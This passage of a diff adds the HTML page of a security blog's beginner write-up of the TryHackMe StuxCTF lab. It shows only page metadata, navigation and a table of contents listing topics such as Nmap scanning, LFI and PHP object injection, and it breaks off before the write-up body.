@@ -1,0 +1,1662 @@
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="dark"
+  data-auto-appearance="true"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+  
+    <meta http-equiv="content-language" content="en">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color">
+
+  
+  <title>StuxCTF &middot; HushKat&#39;s Cyber Den</title>
+    <meta name="title" content="StuxCTF &middot; HushKat&#39;s Cyber Den">
+
+  
+  <meta name="description" content="A Boot2Root machine from THM.">
+  <meta name="keywords" content="THM,NMAP,PHP Object Injection attacks,Web,boot2root,B2R,">
+  
+  
+  <link rel="canonical" href="http://localhost:1313/posts/2025-08-31-stuxctf/2025-08-31-stuxctf/">
+  
+  
+  
+  
+    
+  
+  
+  
+  
+  
+  
+  
+    
+    
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.f875dda8a6dc16f33adb8873681506c07444631be7e42b7575718d40698db0db7cd237ac4306f361ed9daaa2f828ff344a9fc7f845cf0217dcbc9360d395f0f9.css"
+    integrity="sha512-&#43;HXdqKbcFvM624hzaBUGwHREYxvn5Ct1dXGNQGmNsNt80jesQwbzYe2dqqL4KP80Sp/H&#43;EXPAhfcvJNg05Xw&#43;Q==">
+
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
+    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
+  
+  
+  
+  
+    
+    
+    
+  
+  
+    
+    
+  
+  
+  
+  
+  
+  
+  
+  
+  
+    
+    <script
+      defer
+      type="text/javascript"
+      id="script-bundle"
+      src="/js/main.bundle.min.f99aa39bcfb5d16a28ec2236bd358df5e465058a67f58b42534a3b15882a6a3513791fd27248c6b5b5cef06337f714070d4784fb776f44d930309b64cce1a2e0.js"
+      integrity="sha512-&#43;Zqjm8&#43;10Woo7CI2vTWN9eRlBYpn9YtCU0o7FYgqajUTeR/SckjGtbXO8GM39xQHDUeE&#43;3dvRNkwMJtkzOGi4A=="
+      data-copy="Copy"
+      data-copied="Copied"></script>
+  
+  
+    
+    <script src="/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js" integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7&#43;kfJ6kKCJxQGC&#43;8wm&#43;Bz9JucDjDTGNew=="></script>
+  
+
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+  
+
+  
+  
+  
+  
+  
+  
+
+  
+  <meta property="og:url" content="http://localhost:1313/posts/2025-08-31-stuxctf/2025-08-31-stuxctf/">
+  <meta property="og:site_name" content="HushKat&#39;s Cyber Den">
+  <meta property="og:title" content="StuxCTF">
+  <meta property="og:description" content="A Boot2Root machine from THM.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-08-31T01:09:33+03:00">
+    <meta property="article:modified_time" content="2025-08-31T01:09:33+03:00">
+    <meta property="article:tag" content="THM">
+    <meta property="article:tag" content="NMAP">
+    <meta property="article:tag" content="PHP Object Injection Attacks">
+    <meta property="article:tag" content="Web">
+    <meta property="article:tag" content="Boot2root">
+    <meta property="article:tag" content="B2R">
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="StuxCTF">
+  <meta name="twitter:description" content="A Boot2Root machine from THM.">
+
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Posts",
+    "name": "StuxCTF",
+    "headline": "StuxCTF",
+    "description": "A Boot2Root machine from THM.",
+    "abstract": "\u003ch1 class=\u0022relative group\u0022\u003eStuxCTF - Complete Beginner\u0026rsquo;s Writeup \n    \u003cdiv id=\u0022stuxctf---complete-beginners-writeup\u0022 class=\u0022anchor\u0022\u003e\u003c\/div\u003e\n    \n    \u003cspan\n        class=\u0022absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\u0022\u003e\n        \u003ca class=\u0022group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\u0022 href=\u0022#stuxctf---complete-beginners-writeup\u0022 aria-label=\u0022Anchor\u0022\u003e#\u003c\/a\u003e\n    \u003c\/span\u003e        \n    \n\u003c\/h1\u003e\n\n\u003ch2 class=\u0022relative group\u0022\u003eIntroduction \n    \u003cdiv id=\u0022introduction\u0022 class=\u0022anchor\u0022\u003e\u003c\/div\u003e\n    \n    \u003cspan\n        class=\u0022absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\u0022\u003e\n        \u003ca class=\u0022group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\u0022 href=\u0022#introduction\u0022 aria-label=\u0022Anchor\u0022\u003e#\u003c\/a\u003e\n    \u003c\/span\u003e        \n    \n\u003c\/h2\u003e\n\u003cp\u003eWelcome to this step-by-step walkthrough of the StuxCTF challenge! This writeup is designed for beginners who want to understand each technique used. We\u0026rsquo;ll cover:\u003c\/p\u003e\n\u003cul\u003e\n\u003cli\u003eNetwork reconnaissance with Nmap\u003c\/li\u003e\n\u003cli\u003eWeb enumeration and directory discovery\u003c\/li\u003e\n\u003cli\u003eDiffie-Hellman cryptography\u003c\/li\u003e\n\u003cli\u003eLocal File Inclusion (LFI) vulnerabilities\u003c\/li\u003e\n\u003cli\u003ePHP Object Injection attacks\u003c\/li\u003e\n\u003cli\u003ePrivilege escalation\u003c\/li\u003e\n\u003c\/ul\u003e\n\u003cp\u003eLet\u0026rsquo;s dive in!\u003c\/p\u003e",
+    "inLanguage": "en",
+    "url" : "http:\/\/localhost:1313\/posts\/2025-08-31-stuxctf\/2025-08-31-stuxctf\/",
+    "author" : {
+      "@type": "Person",
+      "name": ""
+    },
+    "copyrightYear": "2025",
+    "dateCreated": "2025-08-31T01:09:33\u002b03:00",
+    "datePublished": "2025-08-31T01:09:33\u002b03:00",
+    
+    "dateModified": "2025-08-31T01:09:33\u002b03:00",
+    
+    "keywords": ["THM","NMAP","PHP Object Injection attacks","Web","boot2root","B2R"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "1220"
+  }]
+  </script>
+
+
+
+  
+  
+  
+
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js" integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj&#43;KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+  
+  
+
+
+
+
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+</head>
+<body
+    class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content">
+        <span class="font-bold text-primary-600 pe-2 dark:text-primary-400">&darr;</span>
+        Skip to main content
+      </a>
+    </div>
+    
+    
+      
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div
+  class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3 pt-[2px] pr-0 pb-[3px] pl-0">
+  
+  
+    
+    
+
+  <div class="flex flex-1 items-center justify-between">
+    <nav class="flex space-x-3">
+      
+        <a href="/" class="text-base font-medium">
+          HushKat&rsquo;s Cyber Den
+        </a>
+      
+    </nav>
+    
+  <nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12">
+    
+      
+        
+  <a
+  href="/posts/"
+  
+  class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
+  
+  <p class="text-base font-medium" title="Posts">
+    Blog
+  </p>
+</a>
+
+
+
+      
+        
+  <a
+  href="/categories/"
+  
+  class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
+  
+  <p class="text-base font-medium" title="Categories">
+    Categories
+  </p>
+</a>
+
+
+
+      
+        
+  <a
+  href="/tags/"
+  
+  class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
+  
+  <p class="text-base font-medium" title="Tags">
+    Tags
+  </p>
+</a>
+
+
+
+      
+        
+  <a
+  href="/about/"
+  
+  class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
+  
+  <p class="text-base font-medium" title="About">
+    About
+  </p>
+</a>
+
+
+
+      
+        
+  <a
+  href="https://twitter.com/dr0idbot"
+  target="_blank"
+  class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
+  
+    <span >
+      <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg></span>
+    </span>
+  
+  <p class="text-base font-medium" title="">
+    
+  </p>
+</a>
+
+
+
+      
+        
+  <a
+  href="https://github.com/hushkat"
+  target="_blank"
+  class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
+  
+    <span >
+      <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+</span>
+    </span>
+  
+  <p class="text-base font-medium" title="">
+    
+  </p>
+</a>
+
+
+
+      
+    
+
+    
+
+    
+
+    
+      <button
+        id="search-button"
+        aria-label="Search"
+        class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+        title="Search (/)">
+        <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+      </button>
+    
+
+    
+      <div class=" flex items-center">
+        <button
+          id="appearance-switcher"
+          aria-label="Dark mode switcher"
+          type="button"
+          class="text-base hover:text-primary-600 dark:hover:text-primary-400">
+          <div class="flex items-center justify-center dark:hidden">
+            <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+          </div>
+          <div class="items-center justify-center hidden dark:flex">
+            <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+          </div>
+        </button>
+      </div>
+    
+  </nav>
+
+    
+  <div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12">
+    <span></span>
+
+    
+
+    
+
+    
+      <button
+        id="search-button-mobile"
+        aria-label="Search"
+        class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+        title="Search (/)">
+        <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+      </button>
+    
+
+    
+      <button
+        id="appearance-switcher-mobile"
+        aria-label="Dark mode switcher"
+        type="button"
+        class="text-base hover:text-primary-600 dark:hover:text-primary-400 me-1">
+        <div class="flex items-center justify-center dark:hidden">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span>
+        </div>
+        <div class="items-center justify-center hidden dark:flex">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span>
+        </div>
+      </button>
+    
+  </div>
+
+  </div>
+  
+  <div class="-my-2 md:hidden">
+    <div id="menu-button" class="block">
+      
+        <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+</span>
+        </div>
+        <div
+          id="menu-wrapper"
+          class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 pt-[5px]">
+          <ul
+            class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none text-end max-w-7xl">
+            <li id="menu-close-button">
+              <span
+                class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+                <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+              </span>
+            </li>
+
+            
+              
+  <li class="mt-1">
+  <a
+    href="/posts/"
+    
+    class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-bg font-bg" title="Posts">
+      Blog
+    </p>
+  </a>
+</li>
+
+
+
+            
+              
+  <li class="mt-1">
+  <a
+    href="/categories/"
+    
+    class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-bg font-bg" title="Categories">
+      Categories
+    </p>
+  </a>
+</li>
+
+
+
+            
+              
+  <li class="mt-1">
+  <a
+    href="/tags/"
+    
+    class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-bg font-bg" title="Tags">
+      Tags
+    </p>
+  </a>
+</li>
+
+
+
+            
+              
+  <li class="mt-1">
+  <a
+    href="/about/"
+    
+    class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-bg font-bg" title="About">
+      About
+    </p>
+  </a>
+</li>
+
+
+
+            
+              
+  <li class="mt-1">
+  <a
+    href="https://twitter.com/dr0idbot"
+    
+      target="_blank"
+    
+    class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
+    
+      <div >
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg></span>
+      </div>
+    
+    <p class="text-bg font-bg" title="">
+      
+    </p>
+  </a>
+</li>
+
+
+
+            
+              
+  <li class="mt-1">
+  <a
+    href="https://github.com/hushkat"
+    
+      target="_blank"
+    
+    class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
+    
+      <div >
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+</span>
+      </div>
+    
+    <p class="text-bg font-bg" title="">
+      
+    </p>
+  </a>
+</li>
+
+
+
+            
+
+          </ul>
+          
+        </div>
+      
+    </div>
+  </div>
+
+</div>
+
+
+
+
+
+    
+    <div class="relative flex flex-col grow">
+      <main id="main-content" class="grow">
+        
+  
+  <article>
+    
+    
+      
+      
+      
+      
+        
+
+
+
+    <div id="hero" class="h-[150px] md:h-[200px]"></div>
+  
+  <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom">
+    
+    
+      
+    
+    <img
+      id="background-image"
+      src="/cover-2288779674_12177720153267741176_hu_1c6e09b520d31e1d.png"
+      alt="Background Image"
+      class="absolute inset-0 w-full h-full object-cover">
+    <div
+      class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal"></div>
+    <div
+      class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal"></div>
+  </div>
+
+  
+    <div
+      id="background-blur"
+      class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl"></div>
+    
+    
+    <script
+      type="text/javascript"
+      src="/js/background-blur.min.00a57c73ea12f2cab2980c3c3d649e89f6d82f190f74bbe2b67f2f5e39ab7d032ece47086400ca05396758aace13299da49aca43ea643d2625e62c506267a169.js"
+      integrity="sha512-AKV8c&#43;oS8sqymAw8PWSeifbYLxkPdLvitn8vXjmrfQMuzkcIZADKBTlnWKrOEymdpJrKQ&#43;pkPSYl5ixQYmehaQ=="
+      data-blur-id="background-blur"
+      data-image-id="background-image"
+      data-image-url="/cover-2288779674_12177720153267741176.png"></script>
+  
+      
+    
+
+    
+    <header id="single_header" class="mt-5 max-w-prose">
+      
+      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        StuxCTF
+      </h1>
+      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+        
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+  
+
+  
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2025-08-31T01:09:33&#43;03:00">31 August 2025</time><span class="px-2 text-primary-500">&middot;</span><span>1220 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">6 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+
+  
+  
+
+  
+  
+
+
+
+      </div>
+      
+        
+  
+  
+  
+  
+  
+  
+
+  
+
+  
+    
+    
+<div class="flex author">
+  
+  <div class="place-self-center">
+    
+    
+    <div class="text-2xl sm:text-lg">
+</div>
+  </div>
+</div>
+
+  
+
+  
+
+  
+    <div class="mb-5"></div>
+  
+
+      
+    </header>
+
+    
+    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+      
+      
+      
+      
+      
+      
+        <div class="order-first lg:ml-auto px-0 lg:order-last lg:ps-8">
+          <div class="toc ps-5 print:hidden lg:sticky lg:top-10">
+            
+              <details
+  open
+  id="TOCView"
+  class="toc-right mt-0 overflow-y-auto overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg -ms-5 ps-5 pe-2 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted border-s-1 -ms-5 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#initial-reconnaissance">Initial Reconnaissance</a>
+      <ul>
+        <li><a href="#step-1-port-scanning-with-nmap">Step 1: Port Scanning with Nmap</a></li>
+      </ul>
+    </li>
+    <li><a href="#web-application-analysis">Web Application Analysis</a>
+      <ul>
+        <li><a href="#step-2-examining-robotstxt">Step 2: Examining robots.txt</a></li>
+        <li><a href="#step-3-investigating-the-main-website">Step 3: Investigating the Main Website</a></li>
+      </ul>
+    </li>
+    <li><a href="#cryptography-challenge">Cryptography Challenge</a>
+      <ul>
+        <li><a href="#step-4-understanding-diffie-hellman-key-exchange">Step 4: Understanding Diffie-Hellman Key Exchange</a></li>
+        <li><a href="#step-5-solving-the-cryptographic-puzzle">Step 5: Solving the Cryptographic Puzzle</a></li>
+      </ul>
+    </li>
